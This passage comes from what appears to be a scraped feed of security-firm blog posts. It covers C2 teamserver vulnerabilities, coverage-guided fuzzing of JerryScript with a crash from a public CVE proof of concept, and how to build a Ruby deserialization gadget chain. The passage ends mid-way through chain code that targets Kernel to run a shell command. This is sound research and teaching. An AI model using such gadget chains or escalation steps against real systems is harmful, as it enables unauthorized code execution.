System.Private.CoreLib.dll\nwhich means Process\ncan’t be directly used. However previous cool research on Covenant by 0xcoastal found a blog post by Tim Malcolmvetter that showed that only the Activator\nand Assembly\nclasses are required to perform process injection of arbitrary .NET assemblies. That research left writing the exploit proof of concept as an exercise for the reader, so I implemented an attack script, completing the escalation from low privileged user to shell on the Covenant teamserver.\nThe Covenant developer acknowledged the escalation of privilege vulnerability and that it would be fixed next time he worked on Covenant. He asked for the following addendum to be included: “Network access to a Covenant listener is not sufficient for this vulnerability. This vulnerability requires logical access to Covenant’s management port, which should never be publicly exposed. This is an authenticated privilege escalation that requires access to a valid, existing user account. RCE on the Covenant server through the management interface as an Administative user via custom profiles is known and is intended functionality. Even though Covenant is not currently in active development, Covenant is still in beta (pre v1.0). Covenant is developed as a hobby and has never been professionally evaluated for security risks.”\nMythic\nOne popular C2 framework that is absent so far is Mythic. Mythic is designed differently to most C2s in that it is a modular platform that must be customized as it doesn’t come with a built-in agent. Each part of the Mythic system has its own Docker container, and starting Mythic involves launching eight Docker containers by default (one for the webserver, one for the database, one for the GraphQL API etc), and then you add more containers for the particular agents and transports you want to use.\nThis has freed up Mythic to focus more on the architecture and the collaboration experience on the teamserver rather than building stealthy agents. The web UI does look a little dated on the surface, but once you start interacting with the server, it’s clear that Mythic has tons of teamserver functionality and quality-of-life features, more than any other C2 framework I looked at. The platform has full user and service account role management and enables launching campaigns involving different operators with several permission levels. Mythic is also advanced in terms of tracking everything that happens during a campaign, and the data is easily searchable in order to accelerate reporting.\nFrom the quick code review I did, I didn’t spot any glaring flaws in Mythic’s API authentication and logic, nor any opportunities for RCE on the Mythic server. But Mythic was overkill for the HackTheBox labs I was doing so I didn’t dive deep into it. It looks great for larger operations and is currently more actively developed than any other open source C2 framework. I wonder if this is the future of open source C2 frameworks – a modular collaboration platform which you can easily plug your own agent into, or even develop your own API frontend for, rather than a tight coupling of agent, client, and teamserver components.\nConclusion\nOverall, in the course of this exploration I learned a few things. C2 frameworks are designed to help you run commands on other people’s computers, but ironically many C2 frameworks are vulnerable to having unauthorized commands run on them. In some cases, simply launching these frameworks with the default options on a public network (such as the HackTheBox VPN) leaves you open to RCE. I see this as important to highlight, as many users are hobbyists experimenting and playing CTFs with their buddies, and won’t be doing an advanced operational deployment of the teamservers.\nThe origin of the vulnerabilities is the complexity and number of roles that a teamserver is required to fulfill in C2 frameworks. The teamserver compiles exploits on behalf of operators, displays data from external untrusted IPs in the UI, and downloads files from hacked systems. Preventing these features from being exploited requires strictly validating any external input and minimizing the number of calls to system()\nfunctions. The C2 frameworks tested generally performed this validation, but made one oversight somewhere which meant the attacker input flowed into powerful sink functions. Frameworks have the best chance at avoiding such vulnerabilities by strongly enforcing data boundaries between agent, teamserver, and client. For example, see the comparison of Ninja vs Sliver’s approach to the Skywalker vulnerability preconditions (under the Ninja section above).\nI was surprised at how many cool open source C2 frameworks are no longer maintained. Besides the usual constraints on open source developers’ time and interest, I wonder if there’s a cycle where new frameworks are hyped for being able to bypass Defender when they’re first released, but soon get signatures made for them. The state of the art moves forward quickly and the developer gets fed up with the amount of low effort issues that get sent their way. However, I expect there are plenty of active private forks out there of publicly dead frameworks.\nThis is another reason why the “bring your own agent” model makes sense for open source C2 frameworks (as discussed in the Atomics on a Friday podcast). Cobalt Strike’s default transport and beacon behaviors are so heavily fingerprinted that they require substantial patching and customization to work in reasonably defended environments. As soon as open source C2 frameworks are released, their agents and transport protocols start to suffer the same fate. The client-facing part of the teamserver and the client itself are the components of the system that are least exposed. Making these unexposed components reliable/secure/feature-rich with the expectation that the operators develop their own closed source evasive agents and transports is a practical design decision.\nProof of concept vulnerabilities are released here.\nArtwork by Caleb Nelson", "timestamp": "2025-10-21T13:34:15.368177"}
{"source": "blog", "feed": "https://blog.includesecurity.com/rss", "title": "Coverage Guided Fuzzing – Extending Instrumentation to Hunt Down Bugs Faster!", "url": "https://blog.includesecurity.com/2024/04/coverage-guided-fuzzing-extending-instrumentation/", "published": "Thu, 25 Apr 2024 18:30:28 +0000", "content": "We at IncludeSec sometimes have the need to develop fuzzing harnesses for our clients as part of our security assessment and pentesting work. Using fuzzing in an assessment methodology can uncover vulnerabilities in modern and complex software during security assessments by providing a faster way to submit highly structured inputs to the applications. This technique is usually applied when a more comprehensive effort beyond manual and traditional automated testing are requested by our clients to provide an additional analysis to uncover more esoteric vulnerabilities.\nIntroduction\nCoverage-guided fuzzing is a useful capability in advanced fuzzers (AFL, libFuzzer, Fuzzilli, and others). This capability permits the fuzzer to acknowledge if an input can discover new edges or branches in the binary execution paths. An edge links two branches in a control flow graph (CFG). For instance, if a logical condition involves an if-else\nstatement, there would be two edges, one for the if\nand the other for the else\nstatement. It is a significant part of the fuzzing process, helping determine if the target program’s executable code is effectively covered by the fuzzer.\nA guided fuzzing process usually utilizes a coverage-guided fuzzing (CGF) technique, employing very basic instrumentation to collect data needed to identify if a new edge or coverage block is hit during the execution of a fuzz test case. The instrumentation is code added during the compilation process, utilized for a number of reasons, including software debugging which is how we will use it in this post.\nHowever, CGF instrumentation techniques can be extended, such as by adding new metrics, as demonstrated in this paper [1], where the authors consider not only the edge count but when there is a security impact too. Generally, extending instrumentation is useful to retrieve more information from the target programs.\nIn this post, we modify the Fuzzilli patch for the software JerryScript. JerryScript has a known and publicly available vulnerability/exploit, that we can use to show how extending Fuzzilli’s instrumentation could be helpful for more easily identifying vulnerabilities and providing more useful feedback to the fuzzer for further testing. Our aim is to demonstrate how we can modify the instrumentation and extract useful data for the fuzzing process.\nFuzzing\nFuzzing is the process of submitting random inputs to trigger an unexpected behavior from the application. In recent approaches, the fuzzers consider various aspects of the target application for generating inputs, including the seeds – sources for generating the inputs. Since modern software has complex structures, we can not reach satisfactory results using simple inputs. In other words, by not affecting most of the target program it will be difficult to discover new vulnerabilities.\nThe diagram below shows an essential structure for a fuzzer with mutation strategy and code coverage capability.\n- Seeds are selected;\n- The mutation process takes the seeds to originate inputs for the execution;\n- The execution happens;\n- A vulnerability can occur or;\n- The input hits a new edge in the target application; the fuzzer keeps mutating the same seed or;\n- The input does not hit new edges, and the fuzzer selects a new seed for mutation.\nThe code coverage is helpful to identify if the input can reach different parts of the target program by pointing to the fuzzer that a new edge or block was found during the execution.\nCLANG\nClang [Clang] is a compiler for the C, C++, Objective-C, and Objective-C++ programming languages. It is part of the LLVM project and offers advantages over traditional compilers like GCC (GNU Compiler Collection), including more expressive diagnostics, faster compilation times, and extensive analysis support.\nOne significant tool within the Clang compiler is the sanitizer. Sanitizers are security libraries or tools that can detect bugs and vulnerabilities automatically by instrumenting the code. The compiler checks the compiled code for security implications when the sanitizer is enabled.\nThere are a few types of sanitizers in this context:\n- AddressSanitizer (ASAN): This tool detects memory errors, including vulnerabilities like buffer overflows, use-after-free, double-free, and memory leaks.\n- UndefinedBehaviorSanitizer (UBSAN): Identifies undefined behavior in C/C++ code such as integer overflow, division by zero, null pointer dereferences, and others.\n- MemorySanitizer (MSAN): Detected uninitialized memory reads in C/C++ programs that can lead to unpredictable behavior.\n- ThreadSanitizer (TSAN): Detects uninitialized data races and deadlocks in multithreads C/C++ applications.\n- LeakSanitizer (LSAN): This sanitizer is integrated with AddressSanitizer and helps detect memory leaks, ensuring that all allocated memory is being freed.\nThe LLVM documentation (SanitizerCoverage — Clang 19.0.0git documentation (llvm.org)) provides a few examples of what to do with the tool. The shell snippet below shows the command line for the compilation using the ASAN option to trace the program counter.\n$ clang -o targetprogram -g -fsanitize=address -fsanitize-coverage=trace-pc-guard targetprogram.c\nFrom clang documentation:\n“LLVM has a simple code coverage instrumentation built in (SanitizerCoverage). It inserts calls to user-defined functions on function-, basic-block-, and edge- levels. Default implementations of those callbacks are provided and implement simple coverage reporting and visualization, however if you need just coverage visualization you may want to use SourceBasedCodeCoverage instead.”\nFor example, code coverage in Fuzzilli (googleprojectzero/fuzzilli: A JavaScript Engine Fuzzer (github.com)), Google’s state-of-the-art JavaScript engine fuzzer, utilizes simple instrumentation to respond to Fuzzilli’s process, as demonstrated in the code snippet below.\nextern \"C\" void __sanitizer_cov_trace_pc_guard(uint32_t *guard) { uint32_t index = *guard; __shmem->edges[index / 8] |= 1 << (index % 8); *guard = 0; }\nThe function __sanitizer_cov_trace_pc_guard()\nwill consistently execute when a new edge is found, so no condition is necessary to interpret the new edge discovery. Then, the function changes a bit in the shared bitmap __shmem->edges to 1\n(bitwise OR), and then Fuzzilli analyzes the bitmap after execution.\nOther tools, like LLVM-COV (llvm-cov – emit coverage information — LLVM 19.0.0git documentation), capture code coverage information statically, providing a human-readable document after execution; however, fuzzers need to be efficient, and reading documents in the disk would affect the performance.\nGetting More Information\nWe can modify Fuzzilli’s instrumentation and observe other resources that __sanitizer_cov_trace_pc_guard()\ncan bring to the code coverage. The code snippet below demonstrates the Fuzzilli instrumentation with a few tweaks.\nextern \"C\" void __sanitizer_cov_trace_pc_guard(uint32_t *guard) { uint32_t index = *guard; void *PC = __builtin_return_address(0); char PcDescr[1024]; __sanitizer_symbolize_pc(PC, \"%p %F %L\", PcDescr, sizeof(PcDescr)); printf(\"guard: %p %x PC %s\\n\", guard, *guard, PcDescr); __shmem->edges[index / 8] |= 1 << (index % 8); *guard = 0; }\nWe already know that the function __sanitizer_cov_trace_pc_guard()\nis executed every time the instrumented program hits a new edge. In this case, we are utilizing the function __builtin_return_address()\nto collect the return addresses from every new edge hit in the target program. Now, the pointer PC\nhas the return address information. We can utilize the __sanitizer_symbolize_pc()\nfunction to correlate the address to the symbols, providing more information about the source code file used during the execution.\nMost fuzzers use only the edge information to guide the fuzzing process. However, as we will demonstrate in the next section, using the sanitizer interface can provide compelling information for security assessments.\nLab Exercise\nIn our laboratory, we will utilize another JavaScript engine. In this case, an old version of JerryScript JavaScript engine to create an environment.\n- Operating System (OS): Ubuntu 22.04\n- Target Program: JerryScript\n- Vulnerability: CVE-2023-36109\nSetting Up the Environment\nYou can build JerryScript using the following instructions.\nFirst, clone the repository:\n$ git clone https://github.com/jerryscript-project/jerryscript.git\nEnter into the JerryScript folder and checkout the 8ba0d1b6ee5a065a42f3b306771ad8e3c0d819bc commit.\n$ git checkout 8ba0d1b6ee5a065a42f3b306771ad8e3c0d819bc\nFuzzilli utilizes the head 8ba0d1b6ee5a065a42f3b306771ad8e3c0d819bc for the instrumentation, and we can take advantage of the configuration done for our lab. Apply the patch available in the Fuzziilli’s repository (fuzzilli/Targets/Jerryscript/Patches/jerryscript.patch at main · googleprojectzero/fuzzilli (github.com))\n$ cd jerry-main $ wget https://github.com/googleprojectzero/fuzzilli/raw/main/Targets/Jerryscript/Patches/jerryscript.patch $ patch < jerryscript.patch patching file CMakeLists.txt patching file main-fuzzilli.c patching file main-fuzzilli.h patching file main-options.c patching file main-options.h patching file main-unix.c\nThe instrumented file is jerry-main/main-fuzzilli.c\n, provided by the Fuzzilli’s patch. It comes with the necessary to work with simple code coverage capabilities. Still, we want more, so we can use the same lines we demonstrated in the previous section to update the function __sanitizer_cov_trace_pc_guard()\nbefore the compilation. Also, adding the following header to jerry-main/main-fuzzilli.c\nfile:\n#include <sanitizer/common_interface_defs.h>\nThe file header describes the __sanitizer_symbolize_pc()\nfunction, which will be needed in our implementation. We will modify the function in the jerry-main/main-fuzzilli.c\nfile.\nvoid __sanitizer_cov_trace_pc_guard(uint32_t *guard) { uint32_t index = *guard; if(!index) return; index--; void *PC = __builtin_return_address(0); char PcDescr[1024]; __sanitizer_symbolize_pc(PC, \"%p %F %L\", PcDescr, sizeof(PcDescr)); printf(\"guard: %p %x PC %s\\n\", (void *)guard, *guard, PcDescr); __shmem->edges[index / 8] |= 1 << (index % 8); *guard = 0; }\nWe now change the compilation configuration and disable the strip. The symbols are only needed to identify the possible vulnerable functions for our demonstration.\nIn the root folder CMakeLists.txt file\n# Strip binary if(ENABLE_STRIP AND NOT CMAKE_BUILD_TYPE STREQUAL \"Debug\") jerry_add_link_flags(-g) endif()\nIt defaults with the -s\noption; change to -g\nto keep the symbols. Make sure that jerry-main/CMakeLists.txt\ncontains the main-fuzzilli.c\nfile, and then we are ready to compile. We can then build it using the Fuzzilli instructions.\n$ python jerryscript/tools/build.py --compile-flag=-fsanitize-coverage=trace-pc-guard --profile=es2015-subset --lto=off --compile-flag=-D_POSIX_C_SOURCE=200809 --compile-flag=-Wno-strict-prototypes --stack-limit=15\nIf you have installed Clang, but the output line CMAKE_C_COMPILER_ID is displaying GNU\nor something else, you will have errors during the building.\n$ python tools/build.py --compile-flag=-fsanitize-coverage=trace-pc-guard --profile=es2015-subset --lto=off --compile-flag=-D_POSIX_C_SOURCE=200809 --compile-flag=-Wno-strict-prototypes --stack-limit=15 -- CMAKE_BUILD_TYPE MinSizeRel -- CMAKE_C_COMPILER_ID GNU -- CMAKE_SYSTEM_NAME Linux -- CMAKE_SYSTEM_PROCESSOR x86_64\nYou can simply change the CMakeLists.txt\nfile, lines 28-42 to enforce Clang instead of GNU by modifying USING_GCC 1 to USING_CLANG 1, as shown below:\n# Determining compiler if(CMAKE_C_COMPILER_ID MATCHES \"GNU\") set(USING_CLANG 1) endif() if(CMAKE_C_COMPILER_ID MATCHES \"Clang\") set(USING_CLANG 1) endif()\nThe instrumented binary will be the build/bin/jerry\nfile.\nExecution\nLet’s start by disabling ASLR (Address Space Layout Randomization).\n$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space\nAfter testing, we can re-enable the ASLR by setting the value to 2.\n$ echo 2 | sudo tee /proc/sys/kernel/randomize_va_space\nWe want to track the address to the source code file, and disabling the ASLR will help us stay aware during the analysis and not affect our results. The ASLR will not impact our lab, but keeping the addresses fixed during the fuzzing process will be fundamental.\nNow, we can execute JerryScript using the PoC file for the vulnerability CVE-2023-36109 (Limesss/CVE-2023-36109: a poc for cve-2023-36109 (github.com)), as an argument to trigger the vulnerability. As described in the vulnerability description, the vulnerable function is at ecma_stringbuilder_append_raw\nin jerry-core/ecma/base/ecma-helpers-string.c\n, highlighted in the command snippet below.\n$ ./build/bin/jerry ./poc.js [...] guard: 0x55e17d12ac88 7bb PC 0x55e17d07ac6b in ecma_string_get_ascii_size ecma-helpers-string.c guard: 0x55e17d12ac84 7ba PC 0x55e17d07acfe in ecma_string_get_ascii_size ecma-helpers-string.c guard: 0x55e17d12ac94 7be PC 0x55e17d07ad46 in ecma_string_get_size (/jerryscript/build/bin/jerry+0x44d46) (BuildId: 9588e1efabff4190fd492d05d3710c7810323407) guard: 0x55e17d12e87c 16b8 PC 0x55e17d09dfe1 in ecma_regexp_replace_helper (/jerryscript/build/bin/jerry+0x67fe1) (BuildId: 9588e1efabff4190fd492d05d3710c7810323407) guard: 0x55e17d12ae04 81a PC 0x55e17d07bb64 in ecma_stringbuilder_append_raw (/jerryscript/build/bin/jerry+0x45b64) (BuildId: 9588e1efabff4190fd492d05d3710c7810323407) guard: 0x55e17d12e890 16bd PC 0x55e17d09e053 in ecma_regexp_replace_helper (/jerryscript/build/bin/jerry+0x68053) (BuildId: 9588e1efabff4190fd492d05d3710c7810323407) guard: 0x55e17d12e8b8 16c7 PC 0x55e17d09e0f1 in ecma_regexp_replace_helper (/jerryscript/build/bin/jerry+0x680f1) (BuildId: 9588e1efabff4190fd492d05d3710c7810323407) guard: 0x55e17d133508 29db PC 0x55e17d0cc292 in ecma_builtin_replace_substitute (/jerryscript/build/bin/jerry+0x96292) (BuildId: 9588e1efabff4190fd492d05d3710c7810323407) guard: 0x55e17d133528 29e3 PC 0x55e17d0cc5bd in ecma_builtin_replace_substitute (/jerryscript/build/bin/jerry+0x965bd) (BuildId: 9588e1efabff4190fd492d05d3710c7810323407) guard: 0x55e17d12f078 18b7 PC 0x55e17d040a78 in jmem_heap_realloc_block (/jerryscript/build/bin/jerry+0xaa78) (BuildId: 9588e1efabff4190fd492d05d3710c7810323407) guard: 0x55e17d12f088 18bb PC 0x55e17d040ab4 in jmem_heap_realloc_block (/jerryscript/build/bin/jerry+0xaab4) (BuildId: 9588e1efabff4190fd492d05d3710c7810323407) guard: 0x55e17d12f08c 18bc PC 0x55e17d040c26 in jmem_heap_realloc_block (/jerryscript/build/bin/jerry+0xac26) (BuildId: 9588e1efabff4190fd492d05d3710c7810323407) guard: 0x55e17d12f094 18be PC 0x55e17d040ca3 in jmem_heap_realloc_block (/jerryscript/build/bin/jerry+0xaca3) (BuildId: 9588e1efabff4190fd492d05d3710c7810323407) UndefinedBehaviorSanitizer:DEADLYSIGNAL ==27636==ERROR: UndefinedBehaviorSanitizer: SEGV on unknown address 0x55e27da7950c (pc 0x7fe341fa092b bp 0x000000000000 sp 0x7ffc77634f18 T27636) ==27636==The signal is caused by a READ memory access. #0 0x7fe341fa092b string/../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S:513 #1 0x55e17d0cc3bb in ecma_builtin_replace_substitute (/jerryscript/build/bin/jerry+0x963bb) (BuildId: 9588e1efabff4190fd492d05d3710c7810323407) #2 0x55e17d09e103 in ecma_regexp_replace_helper (/jerryscript/build/bin/jerry+0x68103) (BuildId: 9588e1efabff4190fd492d05d3710c7810323407) #3 0x55e17d084a23 in ecma_builtin_dispatch_call (/jerryscript/build/bin/jerry+0x4ea23) (BuildId: 9588e1efabff4190fd492d05d3710c7810323407) #4 0x55e17d090ddc in ecma_op_function_call_native ecma-function-object.c #5 0x55e17d0909c1 in ecma_op_function_call (/jerryscript/build/bin/jerry+0x5a9c1) (BuildId: 9588e1efabff4190fd492d05d3710c7810323407) #6 0x55e17d0d4743 in ecma_builtin_string_prototype_object_replace_helper ecma-builtin-string-prototype.c #7 0x55e17d084a23 in ecma_builtin_dispatch_call (/jerryscript/build/bin/jerry+0x4ea23) (BuildId: 9588e1efabff4190fd492d05d3710c7810323407) #8 0x55e17d090ddc in ecma_op_function_call_native ecma-function-object.c #9 0x55e17d0909c1 in ecma_op_function_call (/jerryscript/build/bin/jerry+0x5a9c1) (BuildId: 9588e1efabff4190fd492d05d3710c7810323407) #10 0x55e17d0b929f in vm_execute (/jerryscript/build/bin/jerry+0x8329f) (BuildId: 9588e1efabff4190fd492d05d3710c7810323407) #11 0x55e17d0b8d4a in vm_run (/jerryscript/build/bin/jerry+0x82d4a) (BuildId: 9588e1efabff4190fd492d05d3710c7810323407) #12 0x55e17d0b8dd0 in vm_run_global (/jerryscript/build/bin/jerry+0x82dd0) (BuildId: 9588e1efabff4190fd492d05d3710c7810323407) #13 0x55e17d06d4a5 in jerry_run (/jerryscript/build/bin/jerry+0x374a5) (BuildId: 9588e1efabff4190fd492d05d3710c7810323407) #14 0x55e17d069e32 in main (/jerryscript/build/bin/jerry+0x33e32) (BuildId: 9588e1efabff4190fd492d05d3710c7810323407) #15 0x7fe341e29d8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16 #16 0x7fe341e29e3f in __libc_start_main csu/../csu/libc-start.c:392:3 #17 0x55e17d0412d4 in _start (/jerryscript/build/bin/jerry+0xb2d4) (BuildId: 9588e1efabff4190fd492d05d3710c7810323407) UndefinedBehaviorSanitizer can not provide additional info. SUMMARY: UndefinedBehaviorSanitizer: SEGV string/../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S:513 ==27636==ABORTING\nUsing this technique, we could identify the root cause of the vulnerability in the function ecma_stringbuilder_append_raw()\naddress in the stack trace.\nHowever, if we rely only on the sanitizer to check the stack trace, we won’t be able to see the vulnerable function name in our output:\n$ ./build/bin/jerry ./poc.js [COV] no shared memory bitmap available, skipping [COV] edge counters initialized. Shared memory: (null) with 14587 edges UndefinedBehaviorSanitizer:DEADLYSIGNAL ==54331==ERROR: UndefinedBehaviorSanitizer: SEGV on unknown address 0x5622ae01350c (pc 0x7fc1925a092b bp 0x000000000000 sp 0x7ffed516b838 T54331) ==54331==The signal is caused by a READ memory access. #0 0x7fc1925a092b string/../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S:513 #1 0x5621ad66636b in ecma_builtin_replace_substitute (/jerryscript/build/bin/jerry+0x9636b) (BuildId: 15a3c1cd9721e9f1b4e15fade2028ddca6dc542a) #2 0x5621ad6380b3 in ecma_regexp_replace_helper (/jerryscript/build/bin/jerry+0x680b3) (BuildId: 15a3c1cd9721e9f1b4e15fade2028ddca6dc542a) #3 0x5621ad61e9d3 in ecma_builtin_dispatch_call (/jerryscript/build/bin/jerry+0x4e9d3) (BuildId: 15a3c1cd9721e9f1b4e15fade2028ddca6dc542a) #4 0x5621ad62ad8c in ecma_op_function_call_native ecma-function-object.c #5 0x5621ad62a971 in ecma_op_function_call (/jerryscript/build/bin/jerry+0x5a971) (BuildId: 15a3c1cd9721e9f1b4e15fade2028ddca6dc542a) #6 0x5621ad66e6f3 in ecma_builtin_string_prototype_object_replace_helper ecma-builtin-string-prototype.c #7 0x5621ad61e9d3 in ecma_builtin_dispatch_call (/jerryscript/build/bin/jerry+0x4e9d3) (BuildId: 15a3c1cd9721e9f1b4e15fade2028ddca6dc542a) #8 0x5621ad62ad8c in ecma_op_function_call_native ecma-function-object.c #9 0x5621ad62a971 in ecma_op_function_call (/jerryscript/build/bin/jerry+0x5a971) (BuildId: 15a3c1cd9721e9f1b4e15fade2028ddca6dc542a) #10 0x5621ad65324f in vm_execute (/jerryscript/build/bin/jerry+0x8324f) (BuildId: 15a3c1cd9721e9f1b4e15fade2028ddca6dc542a) #11 0x5621ad652cfa in vm_run (/jerryscript/build/bin/jerry+0x82cfa) (BuildId: 15a3c1cd9721e9f1b4e15fade2028ddca6dc542a) #12 0x5621ad652d80 in vm_run_global (/jerryscript/build/bin/jerry+0x82d80) (BuildId: 15a3c1cd9721e9f1b4e15fade2028ddca6dc542a) #13 0x5621ad607455 in jerry_run (/jerryscript/build/bin/jerry+0x37455) (BuildId: 15a3c1cd9721e9f1b4e15fade2028ddca6dc542a) #14 0x5621ad603e32 in main (/jerryscript/build/bin/jerry+0x33e32) (BuildId: 15a3c1cd9721e9f1b4e15fade2028ddca6dc542a) #15 0x7fc192429d8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16 #16 0x7fc192429e3f in __libc_start_main csu/../csu/libc-start.c:392:3 #17 0x5621ad5db2d4 in _start (/jerryscript/build/bin/jerry+0xb2d4) (BuildId: 15a3c1cd9721e9f1b4e15fade2028ddca6dc542a) UndefinedBehaviorSanitizer can not provide additional info. SUMMARY: UndefinedBehaviorSanitizer: SEGV string/../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S:513 ==54331==ABORTING\nThis behavior happens because the vulnerability occurs far from the last execution in the program. Usually, the primary action would be debugging to identify the address of the vulnerable function in memory.\nAdditional Considerations\nThe vulnerable address or address space could be used as a guide during fuzzing. We can then compare the PC\nto the specific address space and instruct the fuzzer to focus on a path by mutating the same input in an attempt to cause other vulnerabilities in the same function or file.\nFor example, we can also feed data related to historical vulnerability identification, correlate dangerous files to their address space in a specific project and include them into the instrumentation, and give feedback to the fuzzer to achieve a more focused fuzzing campaign.\nWe do not necessarily need to use __sanitizer_symbolize_pc\nfor the fuzzing process; this is done only to demonstrate the function and file utilized by each address. Our methodology would only require void *PC = __builtin_return_address(0)\n. The PC\nwill point to the current PC\naddress in the execution, which is the only information needed for the comparison and guiding process.\nAs we demonstrated above, we can retrieve more information about the stack trace and identify vulnerable execution paths. So, let’s look at Fuzzilli’s basic algorithm, described in their NDSS paper.\nIn line 12, it is defined that if a new edge is found, the JavaScript code is converted back to its Intermediate Language (IL) (line 13), and the input is added to the corpus for further mutations in line 14.\nWhat can we change to improve the algorithm? Since we have more information about historical vulnerability identification and stack traces, I think that’s a good exercise for the readers.\nConclusion\nWe demonstrated that we can track the real-time stack trace of a target program by extending Fuzzilli’s instrumentation. By having better visibility into the return address information and its associated source code files, it’s easier to supply the fuzzer with additional paths that can produce interesting results.\nUltimately, this instrumentation technique can be applied to any fuzzer that can take advantage of code coverage capabilities. We intend to use this modified instrumentation output technique in a part 2 blog post at a later date, showing how it can be used to direct the fuzzer to potentially interesting execution paths.", "timestamp": "2025-10-21T13:34:15.906834"}
{"source": "blog", "feed": "https://blog.includesecurity.com/rss", "title": "Discovering Deserialization Gadget Chains in Rubyland", "url": "https://blog.includesecurity.com/2024/03/discovering-deserialization-gadget-chains-in-rubyland/", "published": "Wed, 13 Mar 2024 18:32:24 +0000", "content": "At Include Security we spend a good amount of time extending public techniques and creating new ones. In particular, when we are testing Ruby applications for our clients, we come across scenarios where there are no publicly documented Ruby deserialization gadget chains and we need to create a new one from scratch. But, if you have ever looked at the source code of a Ruby deserialization gadget chain, I bet you’ve thought “what sorcery is this”? Without having gone down the rabbit hole yourself it’s not clear what is happening or why any of it works, but you’re glad that it does work because it was the missing piece of your proof of concept. The goal of this post is to explain what goes into creating a gadget chain. We will explain the process a bit and then walk through a gadget chain that we created from scratch.\nThe final gadget chain in this post utilizes the following libraries: action_view\n, active_record\n, dry-types\n, and eventmachine\n. If your application is using all of these libraries then you’re in luck since at the end of the post you will have another documented gadget chain in your toolbox, at least until there are breaking code changes.\nThe Quest\nA client of ours wanted to get a more concrete example of how deserialization usage in their application could be abused. The focus of this engagement was to create a full-fledged proof of concept from scratch.\nThe main constraints were:\n- All application code and libraries were fair game to use in the gadget chain.\n- We need to target two separate environments with Ruby versions\n2.0.0\nand3.0.4\ndue to the usage of the application by the client in various environments.\nThe universal deserialization gadget from vakzz works for Ruby version <= 3.0.2\nso we already had a win for the first environment that was using Ruby version 2.0.0\n. But we would need something new for the second environment. Universal gadget chains depend only on Gems that are loaded by default. These types of gadget chains are harder to find because there is less code to work with, but the advantage is that it can work in any environment. In this case, we don’t need to limit ourselves since we are making a gadget chain only for us.\nLay of the Land\nDeserialization Basics\nBefore I continue, I would like to mention that these two blog posts are amazing resources and were a great source of inspiration for how to approach finding a new gadget chain. These blog posts give great primers on what makes a gadget chain work and then walk through the process of finding gadgets needed for a gadget chain. Both of these posts target universal gadget chains and even include some scripts to help you with the hunt.\n- https://www.elttam.com/blog/ruby-deserialization/\n- https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html\nIn addition, reading up on Marshal will help you understand serialization and deserialization in Ruby. In an effort to not repeat a lot of what has already been said quite well, this post will leave out some of the details expressed in these resources.\nRuby Tidbits\nHere are some quick Ruby tidbits that might not be obvious to non-Ruby experts, but are useful in understanding our gadget chain.\n1. Class#allocate\nUsed to create a new instance of a class without calling the initialize\nfunction. Since we aren’t really using the objects the way they were intended we want to skip over using the defined constructor. You would use this instead of calling new\n. It may be possible to use the constructor in some cases, but it requires you to pass the correct arguments to create the object and this would just be making our lives harder for no benefit.\na = String.allocate\n2. Object#instance_variable_set\nUsed to set an instance variable.\nsomeObj.instance_variable_set('@name', 'abcd')\n3. @varname\nAn instance variable.\n4. Object#send\nInvokes a method identified by a symbol.\nKernel.send(:system, 'touch/tmp/hello')\n5. <<\nOperators, including <<\n, are just Ruby methods and can be used as part of our gadget chain as well.\ndef <<(value) @another.call(value) end\nThe Hunt\nPreparation\nThe setup is pretty straightforward. You want to set up an environment with the correct version of Ruby, either using rvm\nor a docker image. Then you want to install all the Gems that your target application has. Now that everything is installed pull out grep\n, ripgrep\n, or even Visual Studio Code, if you are so inclined, and start searching in your directory of installed Gems. A quick way to find out what directory to start searching is by using the gem which <gem>\ncommand.\ngem which rails /usr/local/bundle/gems/railties-7.1.3/lib/rails.rb\nSo now we know that /usr/local/bundle/gems/\nis where we begin our search. What do we actually search for?\nGrep, Cry, Repeat\nYou are going to hit a lot of dead ends when creating a gadget chain, but you forget all about the pain once you finally get that touch\ncommand to write a file. Creating a gadget chain requires you to work on it from both ends, the initial kick off gadget and the code execution gadget. You make progress on both ends until eventually you meet halfway through a gadget that ties everything together. Overall the following things need to happen:\n- Find an initial kick off gadget, which is the start of the chain.\n- Find classes that implement the\nmarshal_load\ninstance method and that can be tied to other gadgets.\n- Find classes that implement the\n- Find a way to trigger\nKernel::system\n, which is the end of the chain.- You can also trigger any other function as well. It just depends on what you are trying to accomplish with your gadget chain.\n- Find a way to store and pass a shell command.\n- We do this with Gadget C later in the post.\n- Tie a bunch of random function calls to get you from the start to the end.\nThe main approach to step 1 was to load a list of Gems into a script and then use this neat Ruby script from Luke Jahnke:\nObjectSpace.each_object(::Class) do |obj| all_methods = obj.instance_methods + obj.protected_instance_methods + obj.private_instance_methods if all_methods.include? :marshal_load method_origin = obj.instance_method(:marshal_load).inspect[/\\((.*)\\)/,1] || obj.to_s puts obj puts \" marshal_load defined by #{method_origin}\" puts \" ancestors = #{obj.ancestors}\" puts end end\nThe main approach to steps 2-4 was to look for instance variables that have a method called on them In other words look for something like @block.send()\n. The reason being so that we can set the instance variable to another object and call that method on it.\nBelieve it or not, the workhorse for this process were the two following commands. The purpose of these commands was to find variations of @variable.method(\nas previously explained.\ngrep --color=always -B10 -A10 -rE '@[a-zA-Z0-9_]+\\.[a-zA-Z0-9_]+\\(' --include \\*.rb | less\nOccasionally, I would narrow down the method using a modified grep\nwhen I wanted to look for a specific method to fit in the chain. In this case I was looking for @variable.write(\n.\ngrep --color=always -B10 -A10 -rE '@[a-zA-Z0-9_]+\\.write\\(' --include \\*.rb | less\nThere is a small chance that valid gadgets could consist of unicode characters or even operators so these regexes aren’t perfect, but in this case they were sufficient to discover the necessary gadgets.\nIt’s hard to have one consistent approach to finding a gadget chain, but this should give you a decent starting point.\nCompleted Gadget Chain\nNow let’s go through the final gadget chain that we came up with and try to make sense of it. The final chain utilized the following libraries: action_view\n, active_record\n, dry-types\n, and eventmachine\n.\nrequire 'action_view' # required by rails require 'active_record' # required by rails require 'dry-types' # required by grape require 'eventmachine' # required by faye COMMAND = 'touch /tmp/hello' # Gadget A a = Dry::Types::Constructor::Function::MethodCall::PrivateCall.allocate a.instance_variable_set('@target', Kernel) 